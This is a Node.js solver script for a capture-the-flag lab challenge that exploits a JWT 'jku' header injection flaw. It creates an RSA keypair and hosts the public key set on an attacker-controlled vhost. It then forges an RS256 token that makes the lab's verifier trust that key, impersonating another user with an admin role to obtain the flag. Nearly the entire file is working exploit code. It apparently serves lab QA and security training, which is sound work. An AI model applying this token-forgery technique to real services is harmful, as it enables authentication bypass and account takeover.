#!/usr/bin/env node
/*
 * VLH-CTF QA solver — DSLTV JWT/jku-bypass (JkuBypass).
 *
 * Intended path: log in as a tester → discover the innocent account via
 * GET /api/directory → generate our own RSA keypair → host a JWKS
 * {keys:[{kty,n,e,kid:'atk'}]} on the exploit server (attacker vhost:
 * PUT /pages/keys.json with Host attacker.target.lab:<port>) → forge an
 * RS256 token whose header carries {jku: <our key-set URL>, kid: 'atk'},
 * signed with OUR private key. The verifier (vuln.js) fetches the header
 * jku URL verbatim — no allowlist, no pinning — so it verifies against our
 * key. Claim the flag at GET /flag/jwt.
 *
 * Env: LAB (default http://localhost:8119). Vhosts via the Host header
 * (victim.target.lab / attacker.target.lab).
 * Node 20+ built-ins only. Exit 0 only on a /DSLTV\{JWT-JkuBypass-\d+\}/ flag.
 */
import http from 'node:http';
import crypto from 'node:crypto';

const LAB = process.env.LAB || process.env.LAB_URL || 'http://localhost:8119';
const BASE = new URL(LAB);
const HOSTNAME = BASE.hostname;
const PORT = Number(BASE.port || 80);
const VICTIM = `victim.target.lab:${PORT}`;
const ATTACKER = `attacker.target.lab:${PORT}`;
const JKU = `http://attacker.target.lab:${PORT}/pages/keys.json`; // exploit-server URL (port follows LAB)
const FLAG_RE = /^DSLTV\{JWT-JkuBypass-\d+\}$/;
const PROFILE = 'dsltv-jwt-jku-bypass';

const step = (m) => console.log(`[*] ${m}`);
const ok = (m) => console.log(`[+] ${m}`);
const fail = (m) => { console.error(`[-] ${m}`); process.exit(1); };

function request(method, path, { vhost = VICTIM, body, headers = {} } = {}) {
  return new Promise((resolve, reject) => {
    const payload = body === undefined ? null : (typeof body === 'string' ? body : JSON.stringify(body));
    const h = { host: vhost, ...headers };
    if (payload !== null && !h['content-type']) h['content-type'] = 'application/json';
    const req = http.request({ hostname: HOSTNAME, port: PORT, path, method, headers: h }, (res) => {
      const chunks = [];
      res.on('data', (c) => chunks.push(c));
      res.on('end', () => resolve({ status: res.statusCode, text: Buffer.concat(chunks).toString('utf8') }));
    });
    req.setTimeout(5000, () => req.destroy(new Error(`request timeout: ${method} ${path}`)));
    req.on('error', reject);
    if (payload !== null) req.write(payload);
    req.end();
  });
}

const asJson = (r) => { try { return JSON.parse(r.text); } catch (_) { return null; } };
const b64u = (obj) => Buffer.from(JSON.stringify(obj)).toString('base64url');

async function main() {
  step(`target ${LAB} (Host: ${VICTIM}) — profile ${PROFILE}`);

  /* 1. log in as the known tester — legit tokens carry jku pointing at /jwks.json */
  const lr = await request('POST', '/login', { body: { username: '0xnhsec', password: 'vlh-tester-01' } });
  const lj = asJson(lr);
  if (lr.status !== 200 || !lj || !lj.token) fail(`tester login failed: HTTP ${lr.status} ${lr.text.slice(0, 200)}`);
  ok(`logged in as 0xnhsec (server token kid=${lj.kid}, jku=<platform /jwks.json>)`);

  /* 2. discover the innocent identity via the legit leak endpoint */
  const dr = await request('GET', '/api/directory');
  const dj = asJson(dr);
  const innocent = dj && dj.users ? dj.users.find((u) => u.role === 'innocent') : null;
  if (!innocent) fail(`innocent not found in /api/directory: HTTP ${dr.status} ${dr.text.slice(0, 200)}`);
  ok(`innocent identity discovered: ${innocent.username}`);

  /* 3. generate our keypair and host the JWKS on the exploit server (attacker vhost) */
  const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', { modulusLength: 2048 });
  const jwk = publicKey.export({ format: 'jwk' });
  const jwks = { keys: [{ kty: jwk.kty, n: jwk.n, e: jwk.e, kid: 'atk', use: 'sig', alg: 'RS256' }] };
  const put = await request('PUT', '/pages/keys.json', { vhost: ATTACKER, body: JSON.stringify(jwks) });
  if (put.status !== 200) fail(`cannot store JWKS on the exploit server: HTTP ${put.status} ${put.text.slice(0, 200)}`);
  const back = await request('GET', '/pages/keys.json', { vhost: ATTACKER });
  const backJson = asJson(back);
  if (back.status !== 200 || !backJson || !Array.isArray(backJson.keys)) {
    fail(`JWKS page not retrievable on the attacker vhost: HTTP ${back.status} ${back.text.slice(0, 200)}`);
  }
  ok(`hosted attacker JWKS at ${JKU} (kid=atk)`);

  /* 4. forge: RS256, header jku → our key set, signed with our private key */
  const header = { alg: 'RS256', typ: 'JWT', kid: 'atk', jku: JKU };
  const payload = { sub: innocent.username, role: 'admin', iat: Math.floor(Date.now() / 1000) };
  const h = b64u(header), p = b64u(payload);
  const sig = crypto.createSign('RSA-SHA256').update(`${h}.${p}`).sign(privateKey, 'base64url');
  const forged = `${h}.${p}.${sig}`;
  ok('forged RS256 token signed with the attacker key (jku → attacker JWKS)');

  /* 5. claim the flag */
  const fr = await request('GET', '/flag/jwt', { headers: { authorization: `Bearer ${forged}` } });
  const fj = asJson(fr);
  if (fr.status === 200 && fj && fj.flag && FLAG_RE.test(fj.flag)) {
    ok(`FLAG ${fj.flag}`);
    process.exit(0);
  }
  fail(`/flag/jwt rejected the forged token: HTTP ${fr.status} ${fr.text.slice(0, 300)}`);
}

main().catch((e) => {
  if (e && (e.code === 'ECONNREFUSED' || e.code === 'ENOTFOUND' || e.code === 'EHOSTUNREACH')) {
    fail(`lab not running (${e.code} on ${LAB}) — start it: docker compose --profile ${PROFILE} up -d`);
  }
  fail(e && e.stack ? e.stack : String(e));
});
